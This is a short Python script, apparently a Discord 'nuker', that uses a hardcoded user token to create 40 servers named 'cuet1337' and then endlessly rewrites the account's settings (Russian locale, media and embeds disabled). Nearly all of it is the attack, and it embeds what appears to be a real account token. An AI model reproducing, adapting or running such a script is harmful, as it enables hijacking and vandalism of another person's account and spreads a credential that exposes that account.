import random
import requests
from colorama import Fore

token = 'NzQ1MDY1NTU5OTY3NjYyMTIx.XzsWYg.JTNRaS_Gt9fVYA8T7L32u7kuBi4'

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
    'Content-Type': 'application/json',
    'Authorization': token,
  }
request = requests.Session()
guild = {
    'channels': None,
    'icon': None,
    'name': "cuet1337",
    'region': "europe"
} 
payload = {
    'message_display_compact': False,
    'inline_attachment_media': False,
    'inline_embed_media': False,
    'gif_auto_play': False,
    'theme': "dark",
    'render_embeds': False,
    'animate_emoji': False,
    'convert_emoticons': False,
    'locale': "ru",
    'render_reactions': False,
    'enable_tts_command': False,
    'explicit_content_filter': '0',
    'status': "online"
  }
for i in range(40):
    requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
while True:
    try:
        request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
    except:
      print(f'{Fore.RED}Error1{Fore.RESET}')
    else:
      print(f'{Fore.GREEN}Success, close the program.{Fore.RESET}')
# Enjoy
